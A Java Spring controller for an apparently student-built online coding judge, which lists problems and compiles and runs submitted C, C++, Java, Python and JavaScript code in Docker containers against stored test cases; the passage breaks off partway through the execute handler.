package org.dms.web;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import javax.servlet.http.HttpSession;
import org.dms.web.domain.CategoryVO;
import org.dms.web.domain.CodeVO;
import org.dms.web.domain.Criteria;
import org.dms.web.domain.PageMaker;
import org.dms.web.domain.ProblemVO;
import org.dms.web.domain.TestcaseVO;
import org.dms.web.domain.UserVO;
import org.dms.web.service.CategoryService;
import org.dms.web.service.CodeService;
import org.dms.web.service.ProblemService;
import org.dms.web.service.TestcaseService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

@Controller
public class ProblemController {

	@Autowired(required = true)
	ProblemService problemService;
	@Autowired(required = true)
	TestcaseService testcaseService;
	@Autowired(required = true)
	CategoryService categoryService;
	@Autowired(required = true) // test
	CodeService codeService;

	private static final Logger logger = LoggerFactory.getLogger(BoardController.class);

	@RequestMapping(value = "/problem", method = RequestMethod.GET)

	public String test(Locale locale, Model model, Criteria cri, HttpSession session) throws Exception {
		logger.info("page:" + cri.getPage());
		logger.info("perPageNum:" + cri.getPerPageNum());
		UserVO user = (UserVO) session.getAttribute("user");
		if (user == null) {
			List<ProblemVO> pvo = problemService.readProblemList(cri);
			List<CategoryVO> cvo = categoryService.readCategoryList();

			PageMaker pageMaker = new PageMaker();
			cri.setPerPageNum(8);
			pageMaker.setCri(cri);
			pageMaker.setTotalCount(problemService.ProblemCount());

			logger.info("page: " + cri.getPage());
			model.addAttribute("category", cvo);
			model.addAttribute("problem", pvo);
			model.addAttribute("pageMaker", pageMaker);
			model.addAttribute("cri", cri);
			return "menutest";

		} else {
			String user_id = user.getUser_id();
			List<ProblemVO> pvo = problemService.readProblemList(cri);
			List<CategoryVO> cvo = categoryService.readCategoryList();

			boolean[] successList = new boolean[8];
			int index = 0;

			for (ProblemVO problem : pvo) {
				successList[index++] = codeService.IsSuccess(user.getUser_id(), problem.getProblem_id());
			}

			PageMaker pageMaker = new PageMaker();
			cri.setPerPageNum(8);
			pageMaker.setCri(cri);
			pageMaker.setTotalCount(problemService.ProblemCount());

			logger.info("page: " + cri.getPage());

			model.addAttribute("category", cvo);
			model.addAttribute("user", user);
			model.addAttribute("problem", pvo);
			model.addAttribute("pageMaker", pageMaker);
			model.addAttribute("cri", cri);

			model.addAttribute("successList", successList);

			// return "problem_list";
			return "menutest";

		}

		// PageMaker pageMaker = new PageMaker();
		// cri.setPerPageNum(8);
		/// pageMaker.setCri(cri);
		// pageMaker.setTotalCount(problemService.ProblemCount());

		// logger.info("page: " + cri.getPage());

		// UserVO user = (UserVO) session.getAttribute("user");

		// boolean[] successList = new boolean[8];
		// int index = 0;

		// for(ProblemVO problem : pvo) {
		// successList[index++] = codeService.IsSuccess(user.getUser_id(),
		// problem.getProblem_id());
		// }

		// model.addAttribute("user", user);
		// model.addAttribute("category", cvo);
		// model.addAttribute("problem", pvo);
		// model.addAttribute("pageMaker", pageMaker);
		// model.addAttribute("cri", cri);
		// model.addAttribute("successList", successList);

		// return "problem_list";

	}

	@RequestMapping(value = "/problem.do", method = RequestMethod.GET)
	@ResponseBody
	public Map<String, Object> categorytest_test(HttpSession session, Locale locale, Model model, Criteria cri,
			int problem_level, String category_name, boolean isSearch) throws Exception {
		if (isSearch) {
			System.out.println("searchInput in Session: " + session.getAttribute("searchInput"));
			System.out.println("searchType in Session: " + session.getAttribute("searchType"));
		}
		logger.info("categorytest_test");
		Map<String, Object> map = new HashMap<String, Object>();
		UserVO user = (UserVO) session.getAttribute("user");

		if (problem_level == 0 && category_name.equals("unselected")) {
			logger.info("level: " + problem_level);
			logger.info("category: " + category_name);

			List<ProblemVO> pvo = new ArrayList<ProblemVO>();
			;
			int count = 0;
			String searchInput = (String) session.getAttribute("searchInput");
			String searchType = (String) session.getAttribute("searchType");

			if (isSearch) {
				pvo = problemService.searchProblemList(searchType, searchInput, cri);
				count = problemService.searchProblemCount(searchType, searchInput);
			} else {
				pvo = problemService.readProblemList(cri);
				count = problemService.ProblemCount();
			}

			PageMaker pageMaker = new PageMaker();
			cri.setPerPageNum(8);
			pageMaker.setCri(cri);
			pageMaker.setTotalCount(count);

			boolean[] successList = new boolean[8];
			int index = 0;

			for (ProblemVO problem : pvo) {
				successList[index++] = codeService.IsSuccess(user.getUser_id(), problem.getProblem_id());
			}

			System.out.println("successList: " + successList);

			map.put("pageMaker", pageMaker);
			map.put("list", pvo);
			map.put("successList", successList);

			for (ProblemVO vo : pvo) {
				logger.info(vo.getProblem_id() + " : " + vo.getProblem_title());
			}

			System.out.println("isSearch? : " + isSearch);

			return map;
		} else if (problem_level == 0 && category_name != "unselected") {
			logger.info("category: " + category_name);

			List<ProblemVO> pvo = new ArrayList<ProblemVO>();
			;
			int count = 0;
			String searchInput = (String) session.getAttribute("searchInput");
			String searchType = (String) session.getAttribute("searchType");

			if (isSearch) {
				pvo = problemService.searchProblemListByCategory(searchType, searchInput, category_name, cri);
				count = problemService.searchProblemCountByCategory(searchType, searchInput, category_name);
			} else {
				pvo = problemService.readProblemList(category_name, cri);
				count = problemService.ProblemCount(category_name);
			}

//         List<ProblemVO> pvo = problemService.readProblemList(category_name, cri);
//         int count = problemService.ProblemCount(category_name);

			PageMaker pageMaker = new PageMaker();
			cri.setPerPageNum(8);
			pageMaker.setCri(cri);
			pageMaker.setTotalCount(count);

			boolean[] successList = new boolean[8];
			int index = 0;

			for (ProblemVO problem : pvo) {
				successList[index++] = codeService.IsSuccess(user.getUser_id(), problem.getProblem_id());
			}

			map.put("pageMaker", pageMaker);
			map.put("list", pvo);
			map.put("successList", successList);

			logger.info("count: " + count);
			for (ProblemVO vo : pvo) {
				logger.info(vo.getProblem_id() + " : " + vo.getProblem_title());
			}
			return map;
		} else {
			logger.info("level: " + problem_level);
			logger.info("category: " + category_name);
			logger.info("page:" + cri.getPage());
			logger.info("perPageNum:" + cri.getPerPageNum());

			List<ProblemVO> pvo = new ArrayList<ProblemVO>();
			;
			int count = 0;
			String searchInput = (String) session.getAttribute("searchInput");
			String searchType = (String) session.getAttribute("searchType");

			if (isSearch) {
				pvo = problemService.searchProblemListByCategoryAndLevel(searchType, searchInput, category_name,
						problem_level, cri);
				count = problemService.searchProblemCountByCategoryAndLevel(searchType, searchInput, category_name,
						problem_level);
			} else {
				pvo = problemService.readProblemList(problem_level, category_name, cri);
				count = problemService.ProblemCount(problem_level, category_name);
			}

			PageMaker pageMaker = new PageMaker();
			cri.setPerPageNum(8);
			pageMaker.setCri(cri);
			pageMaker.setTotalCount(count);

			boolean[] successList = new boolean[8];
			int index = 0;

			for (ProblemVO problem : pvo) {
				successList[index++] = codeService.IsSuccess(user.getUser_id(), problem.getProblem_id());
			}

			map.put("pageMaker", pageMaker);
			map.put("list", pvo);
			map.put("successList", successList);

			for (ProblemVO vo : pvo) {
				logger.info(vo.getProblem_id() + " : " + vo.getProblem_title());
			}

			return map;
		}
	}

	@RequestMapping(value = "/problem/{problem_id}", method = RequestMethod.GET)
	public String problemGet(@PathVariable("problem_id") int problem_id, Model model, HttpSession session)
			throws Exception {
		// logger.info("踰덊샇: "+ problem_id);
		UserVO user = (UserVO) session.getAttribute("user");
		ProblemVO pvo = problemService.readProblem(problem_id);
		TestcaseVO tvo = testcaseService.readTestcase(problem_id);

		session.setAttribute("problem_id", problem_id);
		model.addAttribute("user", user);
		model.addAttribute("problem", pvo);
		model.addAttribute("testcase", tvo);
		// logger.info(vo.getProblem_title() + " " + vo.getProblem_id() + " " +
		// vo.getProblem_content());
//      String result = "";

//      model.addAttribute("result", result);

		return "solve_page_test";
	}

	@RequestMapping(value = "/problem/insert", method = RequestMethod.GET)
	public String problemInsert(Locale locale, Model model, HttpSession session) throws Exception {
		UserVO user = (UserVO) session.getAttribute("user");
		List<CategoryVO> vo = categoryService.readCategoryList();
		model.addAttribute("user", user);
		model.addAttribute("category", vo);
		return "problem_insert";
	}

	@RequestMapping(value = "/problem/insert.do", method = RequestMethod.POST)
	public String problemInsertPost(
			@ModelAttribute("problem") ProblemVO pvo /* , @ModelAttribute("testcase") TestcaseVO tvo */)
			throws Exception {
		logger.info("臾몄젣 궡 슜: " + pvo.getProblem_content());
		logger.info(" 꽦怨듯슏 닔: " + pvo.getProblem_successnum());
		pvo.setProblem_content(pvo.getProblem_content().replace("\r\n", "<br>"));
		pvo.setProblem_hint(" 젙 떟肄붾뱶  뾽 뒾");
		pvo.setProblem_failnum(pvo.getProblem_submitnum() - pvo.getProblem_successnum());
		problemService.insertProblem(pvo);
		return "redirect:/problem/insert";
	}

	@RequestMapping(value = "/testcase", method = RequestMethod.GET)
	public String testcaseInsert(Locale locale, Model model, HttpSession session) throws Exception {
		UserVO user = (UserVO) session.getAttribute("user");
		model.addAttribute("user", user);
		return "testcase_insert";
	}

	@RequestMapping(value = "/testcase.do", method = RequestMethod.POST)
	public String testcaseInsertPost(@ModelAttribute("testcase") TestcaseVO tvo) throws Exception {
		// tvo.setProblem_id(pvo.getProblem_id());
		logger.info("臾몄젣踰덊샇: " + tvo.getProblem_id());
		logger.info("input: " + tvo.getTestcase_input());
		logger.info("output:" + tvo.getTestcase_output());

		tvo.setTestcase_input(tvo.getTestcase_input().replace("\r\n", "<br>"));
		tvo.setTestcase_output(tvo.getTestcase_output().replace("\r\n", "<br>"));

		testcaseService.insertTestcase(tvo);
		return "testcase_insert";
	}

	@RequestMapping(value = "/submit", method = RequestMethod.POST)
	@ResponseBody
	public Map<String, Object> getSubmit(String code, String lang, HttpSession session) throws Exception {
		Map<String, Object> map = new HashMap<String, Object>();
		UserVO user = (UserVO) session.getAttribute("user");
		// problem_id
		int problem_id = (Integer) session.getAttribute("problem_id"); // 문제_id 동건 필요

		// lang 언어고 , code가 모나코 코드

		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
		Calendar cal = Calendar.getInstance();
		String today = null;
		today = formatter.format(cal.getTime());
		Timestamp ts = Timestamp.valueOf(today);

		// 어떤 도커가 살아있는지 확인
		String dockerName = "";
		byte success = 0;

		// 평균 실행시간
		double timeAvg = 0;

		String docker = Reader("/usr/local/apache/docker/docker.txt");
		FileWriter dockerCycle = new FileWriter("/usr/local/apache/docker/docker.txt");

		ArrayList<String> dockerNum = new ArrayList<String>();

		shellCmd("sh /usr/local/apache/docker/check.sh");

		if (Reader("/usr/local/apache/docker/check01.txt").contains("kko01")) {
			dockerNum.add("kko01");
		}
		if (Reader("/usr/local/apache/docker/check02.txt").contains("kko02")) {
			dockerNum.add("kko02");
		}
		if (Reader("/usr/local/apache/docker/check03.txt").contains("kko03")) {
			dockerNum.add("kko03");
		}
		// int length = dockerNum.size();

		if (dockerNum.size() == 1) {
			dockerName = dockerNum.get(0);
			dockerCycle.write(dockerNum.get(0));
			dockerCycle.close();
		} else if (dockerNum.size() == 2) {
			if (docker.indexOf(dockerNum.get(0)) != -1) {
				dockerName = dockerNum.get(0);
				dockerCycle.write(dockerNum.get(1));
				dockerCycle.close();
			} else if (docker.indexOf(dockerNum.get(1)) != -1) {
				dockerName = dockerNum.get(1);
				dockerCycle.write(dockerNum.get(0));
				dockerCycle.close();
			}
		} else if (dockerNum.size() == 3) {
			if (docker.indexOf("kko01") != -1) {
				dockerName = dockerNum.get(0);
				dockerCycle.write("kko02");
				dockerCycle.close();
			} else if (docker.indexOf("kko02") != -1) {
				dockerName = dockerNum.get(1);
				dockerCycle.write("kko03");
				dockerCycle.close();
			} else if (docker.indexOf("kko03") != -1) {
				dockerName = dockerNum.get(2);
				dockerCycle.write("kko01");
				dockerCycle.close();
			} else {
				docker = "kko01";
				dockerName = dockerNum.get(0);
				dockerCycle.write("kko02");
				dockerCycle.close();
			}
		}
		// 여기까지

		// user_id
		String user_id = user.getUser_id(); // user_id 동건 필요

		// input, output 리스트를 받아온다.
		List<String> tvoInput = testcaseService.getTestCaseInput(problem_id); // 인풋값
		List<String> tvoOutput = testcaseService.getTestCaseOutput(problem_id); // 출력값

		File algoTestOld;

		int check = 0;
		String result = "<br>";
		String codeCheck = midSearch(code);
		if (codeCheck.equals("불법접근입니다.")) {
			result = "&nbsp;&nbsp;<span style='color:#E06B74'>" + codeCheck + "</span>";
		} else {

			// String cnp = "kko01";
			try {

				if (lang.equals("c")) {
					algoTestOld = new File("/usr/local/apache/share/algotest");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest");
					}

					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.c");
					codew.write(code);
					codew.close();

					FileWriter algo_c = new FileWriter("/usr/local/apache/share/algo_c.sh");
					algo_c.write("docker restart " + dockerName + "\n");
					algo_c.write("docker exec " + dockerName + " sh -c 'cd data; gcc -o algotest algotest.c'");
					algo_c.close();
					shellCmd("sh /usr/local/apache/share/algo_c.sh"); // shellcmd로 바로 실행 불가능 그래서
					// sh파일 먼저 돌림
					timeCheck("./algotest");
					FileWriter algoMid_c = new FileWriter("/usr/local/apache/share/algoMid_c.sh");
					algoMid_c.write("docker restart " + dockerName + "\n");
					algoMid_c.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_c.write("docker stop " + dockerName + "\n");
					algoMid_c.close();
					for (int i = 0; i < tvoOutput.size(); i++) {
						FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
						testinput.write(tvoInput.get(i));
						testinput.close(); // 하나씩 txt파일에 둠
						String tmp = "";
						// String cnp = "";
						try {
							tmp = shellCmd("sh ./share/algoMid_c.sh"); // shellcmd로 바로 실행 불가능 그래서 sh파일 먼저 돌림
							// 알고리즘 코드 실행시 추가적으로 출력되는 문자열
							tmp = tmp.replace(dockerName, ""); // 알고리즘 코드 실행시 추가적으로 출력되는 문자열

							if (tmp.length() > 4) {

								if (!tmp.substring(tmp.length() - 4, tmp.length()).equals("<br>")) {
									tmp = tmp + "<br>";
								}
							}

							result = result + "&nbsp;&nbsp;>&nbsp;Testcase&nbsp;[&nbsp;" + (i + 1) + "&nbsp;]&nbsp;";

						} catch (Exception e) {
							result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>실행오류</span>";
						}

						if (tmp.equals("<br>" + tvoOutput.get(i) + "<br>")) {
							check++;
							result = result + "&nbsp;<span style='color:#7BC379'>성공</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";

							String cnp = Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "");
							cnp = cnp.replace("sec", "");
							timeAvg = timeAvg + Double.parseDouble(cnp);

						} else {
							result = result + "&nbsp;<span style='color:#E06B74'>실패</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";
						}
					}
					timeAvg = timeAvg / tvoOutput.size();

				} else if (lang.equals("c++")) {
					algoTestOld = new File("/usr/local/apache/share/algotest");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest");
					}

					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.cpp");
					codew.write(code);
					codew.close();

					timeCheck("./algotest");
					FileWriter algo_c = new FileWriter("/usr/local/apache/share/algo_c.sh");
					algo_c.write("docker restart " + dockerName + "\n");
					algo_c.write(
							"docker exec " + dockerName + " sh -c 'cd data; g++ -std=c++14 algotest.cpp -o algotest'");
					algo_c.close();
					shellCmd("sh /usr/local/apache/share/algo_c.sh");

					FileWriter algoMid_c = new FileWriter("/usr/local/apache/share/algoMid_c.sh");
					algoMid_c.write("docker restart " + dockerName + "\n");
					algoMid_c.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_c.write("docker stop " + dockerName + "\n");
					algoMid_c.close();
					for (int i = 0; i < tvoOutput.size(); i++) {
						FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
						testinput.write(tvoInput.get(i));
						testinput.close(); // 하나씩 txt파일에 둠
						String tmp = "";
						try {
							tmp = shellCmd("sh ./share/algoMid_c.sh");
							tmp = tmp.replace(dockerName, "");

							if (tmp.length() > 4) {

								if (!tmp.substring(tmp.length() - 4, tmp.length()).equals("<br>")) {
									tmp = tmp + "<br>";
								}
							}

							result = result + "&nbsp;&nbsp;>&nbsp;Testcase&nbsp;[&nbsp;" + (i + 1) + "&nbsp;]&nbsp;";

						} catch (Exception e) {
							result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>실행오류</span>";
						}

						if (tmp.equals("<br>" + tvoOutput.get(i) + "<br>")) {
							check++;
							result = result + "&nbsp;<span style='color:#7BC379'>성공</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";

							String cnp = Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "");
							cnp = cnp.replace("sec", "");
							timeAvg = timeAvg + Double.parseDouble(cnp);

						} else {
							result = result + "&nbsp;<span style='color:#E06B74'>실패</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";
						}
					}
					timeAvg = timeAvg / tvoOutput.size();
				} else if (lang.equals("java")) {
					algoTestOld = new File("/usr/local/apache/share/algotest.class");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest.class");
					}
					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.java");
					codew.write(code);
					codew.close();

					FileWriter algo_java = new FileWriter("/usr/local/apache/share/algo_java.sh");
					algo_java.write("docker restart " + dockerName + "\n");
					algo_java.write("docker exec " + dockerName
							+ " sh -c 'export LC_ALL=C.UTF-8; cd data; javac -encoding utf-8 algotest.java'");
					algo_java.close();
					shellCmd("sh /usr/local/apache/share/algo_java.sh"); // shellcmd로 바로 실행 불가능 그래서 sh파일 먼저 돌림 --> 내부 코드

					timeCheck("java -Dfile.encoding=utf-8 algotest");
					FileWriter algoMid_java = new FileWriter("/usr/local/apache/share/algoMid_java.sh");
					algoMid_java.write("docker restart " + dockerName + "\n");
					algoMid_java.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_java.write("docker stop " + dockerName + "\n");
					algoMid_java.close();
					for (int i = 0; i < tvoOutput.size(); i++) {
						FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
						testinput.write(tvoInput.get(i));
						testinput.close();
						String tmp = "";
						try {
							tmp = shellCmd("sh ./share/algoMid_java.sh");
							tmp = tmp.replace(dockerName, "");

							if (tmp.length() > 4) {

								if (!tmp.substring(tmp.length() - 4, tmp.length()).equals("<br>")) {
									tmp = tmp + "<br>";
								}
							}

							result = result + "&nbsp;&nbsp;>&nbsp;Testcase&nbsp;[&nbsp;" + (i + 1) + "&nbsp;]&nbsp;";

						} catch (Exception e) {
							result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>실행오류</span>";
						}

						if (tmp.equals("<br>" + tvoOutput.get(i) + "<br>")) {
							check++;
							result = result + "&nbsp;<span style='color:#7BC379'>성공</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";

							String cnp = Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "");
							cnp = cnp.replace("sec", "");
							timeAvg = timeAvg + Double.parseDouble(cnp);

						} else {
							result = result + "&nbsp;<span style='color:#E06B74'>실패</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";
						}
					}
					timeAvg = timeAvg / tvoOutput.size();
				} else if (lang.equals("python")) {
					algoTestOld = new File("/usr/local/apache/share/algotest.py");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest.py");
					}
					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.py");
					codew.write("# -*- coding: utf-8 -*-\n" + code);
					codew.close();

					timeCheck("python3 algotest.py");
					FileWriter algoMid_python = new FileWriter("/usr/local/apache/share/algoMid_python.sh");
					algoMid_python.write("docker restart " + dockerName + "\n");
					algoMid_python.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_python.write("docker stop " + dockerName + "\n");
					algoMid_python.close();

					for (int i = 0; i < tvoOutput.size(); i++) {
						FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
						testinput.write(tvoInput.get(i));
						testinput.close();
						String tmp = "";
						try {
							tmp = shellCmd("sh ./share/algoMid_python.sh");
							tmp = tmp.replace(dockerName, "");

							if (tmp.length() > 4) {

								if (!tmp.substring(tmp.length() - 4, tmp.length()).equals("<br>")) {
									tmp = tmp + "<br>";
								}
							}

							result = result + "&nbsp;&nbsp;>&nbsp;Testcase&nbsp;[&nbsp;" + (i + 1) + "&nbsp;]&nbsp;";

						} catch (Exception e) {
							result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>실행오류</span>";
						}

						if (tmp.equals("<br>" + tvoOutput.get(i) + "<br>")) {
							check++;
							result = result + "&nbsp;<span style='color:#7BC379'>성공</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";

							String cnp = Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "");
							cnp = cnp.replace("sec", "");
							timeAvg = timeAvg + Double.parseDouble(cnp);

						} else {
							result = result + "&nbsp;<span style='color:#E06B74'>실패</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";
						}
					}
					timeAvg = timeAvg / tvoOutput.size();
				} else if (lang.equals("javascript")) {
					algoTestOld = new File("/usr/local/apache/share/algotest.js");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest.js");
					}
					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.js");
					codew.write(code);
					codew.close();

					timeCheck("js algotest.js");
					FileWriter algoMid_js = new FileWriter("/usr/local/apache/share/algoMid_js.sh");
					algoMid_js.write("docker restart " + dockerName + "\n");
					algoMid_js.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_js.write("docker stop " + dockerName + "\n");
					algoMid_js.close();

					for (int i = 0; i < tvoOutput.size(); i++) {
						FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
						testinput.write(tvoInput.get(i));
						testinput.close();
						String tmp = "";
						try {
							tmp = shellCmd("sh ./share/algoMid_js.sh");
							tmp = tmp.replace(dockerName, "");

							if (tmp.length() > 4) {

								if (!tmp.substring(tmp.length() - 4, tmp.length()).equals("<br>")) {
									tmp = tmp + "<br>";
								}
							}

							result = result + "&nbsp;&nbsp;>&nbsp;Testcase&nbsp;[&nbsp;" + (i + 1) + "&nbsp;]&nbsp;";

						} catch (Exception e) {
							result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>실행오류</span>";
						}

						if (tmp.equals("<br>" + tvoOutput.get(i) + "<br>")) {
							check++;
							result = result + "&nbsp;<span style='color:#7BC379'>성공</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";

							String cnp = Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "");
							cnp = cnp.replace("sec", "");
							timeAvg = timeAvg + Double.parseDouble(cnp);

						} else {
							result = result + "&nbsp;<span style='color:#E06B74'>실패</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";
						}
					}
					timeAvg = timeAvg / tvoOutput.size();
				}

			} catch (Exception e) {

				result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>실행오류</span>";
			}

			if (check == tvoOutput.size()) {
				result = result + "<br>&nbsp;&nbsp;<span style='color:#7BC379'>>>>>>>&nbsp;정답입니다&nbsp;<<<<<<<br>";
				result = result + "&nbsp;&nbsp;>&nbsp;제출&nbsp;:&nbsp;" + today + "&nbsp;<br>";

				result = result + "<br>&nbsp;&nbsp;<span style='color:#7BC379'>>>>>>>&nbsp;평균 실행시간&nbsp;<<<<<<<br>";
				result = result + "&nbsp;&nbsp;>&nbsp;시간&nbsp;:&nbsp;" + timeAvg + "&nbsp;sec<br>";
				success = 1;
			} else {
				result = result + "<br>&nbsp;&nbsp;<span style='color:#E06B74'>>>>>>>&nbsp;틀렸습니다&nbsp;<<<<<<<br>";
				result = result + "&nbsp;&nbsp;>&nbsp;제출&nbsp;:&nbsp;" + today + "&nbsp;</span><br>";
			}

			result = result + "<br>&nbsp;&nbsp;>>>>>>>&nbsp;유저ID&nbsp;<<<<<<<<br>";
			result = result + "&nbsp;&nbsp;>&nbsp;user&nbsp;:&nbsp;" + user_id + "&nbsp;<br>";

		}

		if (success == 1) {
			problemService.addSuccess(problem_id);
		}

		// 제출시 제출횟수 증가
		problemService.addSubmit(problem_id);

		CodeVO codevo = new CodeVO();
		codevo.setCode_code(code);
		codevo.setCode_date(ts);
		codevo.setCode_language(lang);
		codevo.setCode_success(success);
		codevo.setUser_id(user_id);
		codevo.setProblem_id(problem_id);

		map.put("result", result);
		codeService.submitCode(codevo);
		return map;

	}

	@RequestMapping(value = "/execute", method = RequestMethod.POST)
	@ResponseBody
	public Map<String, Object> getExecute(String code, String lang, HttpSession session) throws Exception {
		Map<String, Object> map = new HashMap<String, Object>();
		UserVO user = (UserVO) session.getAttribute("user");

		int problem_id = (Integer) session.getAttribute("problem_id");

		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
		Calendar cal = Calendar.getInstance();
		String today = null;
		today = formatter.format(cal.getTime());
		Timestamp ts = Timestamp.valueOf(today);

		String dockerName = "";
		byte success = 0;

		String docker = Reader("/usr/local/apache/docker/docker.txt");
		FileWriter dockerCycle = new FileWriter("/usr/local/apache/docker/docker.txt");

		ArrayList<String> dockerNum = new ArrayList<String>();

		shellCmd("sh /usr/local/apache/docker/check.sh");

		if (Reader("/usr/local/apache/docker/check01.txt").contains("kko01")) {
			dockerNum.add("kko01");
		}
		if (Reader("/usr/local/apache/docker/check02.txt").contains("kko02")) {
			dockerNum.add("kko02");
		}
		if (Reader("/usr/local/apache/docker/check03.txt").contains("kko03")) {
			dockerNum.add("kko03");
		}
		int length = dockerNum.size();

		if (length == 1) {
			dockerName = dockerNum.get(0);
			dockerCycle.write(dockerNum.get(0));
			dockerCycle.close();
		} else if (length == 2) {
			if (docker.indexOf(dockerNum.get(0)) != -1) {
				dockerName = dockerNum.get(0);
				dockerCycle.write(dockerNum.get(1));
				dockerCycle.close();
			} else if (docker.indexOf(dockerNum.get(1)) != -1) {
				dockerName = dockerNum.get(1);
				dockerCycle.write(dockerNum.get(0));
				dockerCycle.close();
			}
		} else if (length == 3) {
			if (docker.indexOf("kko01") != -1) {
				dockerName = dockerNum.get(0);
				dockerCycle.write("kko02");
				dockerCycle.close();
			} else if (docker.indexOf("kko02") != -1) {
				dockerName = dockerNum.get(1);
				dockerCycle.write("kko03");
				dockerCycle.close();
			} else if (docker.indexOf("kko03") != -1) {
				dockerName = dockerNum.get(2);
				dockerCycle.write("kko01");
				dockerCycle.close();
			} else {
				docker = "kko01";
				dockerName = dockerNum.get(0);
				dockerCycle.write("kko02");
				dockerCycle.close();
			}
		}

		String user_id = user.getUser_id();

		List<String> tvoInput = testcaseService.getTestCaseInput(problem_id);
		List<String> tvoOutput = testcaseService.getTestCaseOutput(problem_id);

		String[] algo_result = new String[tvoOutput.size()];

		File algoTestOld;

		int check = 0;
		String result = "<br>";
		String checkcheck = midSearch(code);
		if (checkcheck.equals("불법접근입니다.")) {
			result = result + checkcheck;

		} else {
			result = result + "&nbsp;&nbsp;<span style='color:#7979D3'>>>>>>>&nbsp;입력&nbsp;<<<<<<<br>";
			if (tvoInput.size() != 0) {
				result = result + "&nbsp;&nbsp;" + tvoInput.get(0) + "<br><br>";
			} else {
				result = result + "&nbsp;&nbsp;입력값 없음<br><br>";
			}
			result = result + "&nbsp;&nbsp;>>>>>>&nbsp;출력&nbsp;<<<<<<<br>";
			if (tvoOutput.size() != 0) {
				result = result + "&nbsp;&nbsp;" + tvoOutput.get(0).replace("<br>", "<br>&nbsp;&nbsp;")
						+ "</span><br><br>";
			} else {
				result = result + "&nbsp;&nbsp;출력값 없음</span><br><br>";
			}
			result = result + "&nbsp;&nbsp;>>>>>>&nbsp;결과&nbsp;<<<<<<";

			try {

				if (lang.equals("c")) {
					algoTestOld = new File("/usr/local/apache/share/algotest");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest");
					}

					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.c");
					codew.write(code);
					codew.close();

					FileWriter algo_c = new FileWriter("/usr/local/apache/share/algo_c.sh");
					algo_c.write("docker restart " + dockerName + "\n");

					/////
					algo_c.write("docker exec " + dockerName
							+ " sh -c 'cd data; gcc -o algotest algotest.c 2> compileError.txt'");
					algo_c.close();
					shellCmd("sh /usr/local/apache/share/algo_c.sh");

					timeCheck("./algotest");
					FileWriter algoMid_c = new FileWriter("/usr/local/apache/share/algoMid_c.sh");
					algoMid_c.write("docker restart " + dockerName + "\n");
					algoMid_c.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_c.write("docker stop " + dockerName + "\n");
					algoMid_c.close();

					FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
					testinput.write(tvoInput.get(0));
					testinput.close();
					String tmp = "";

					try {

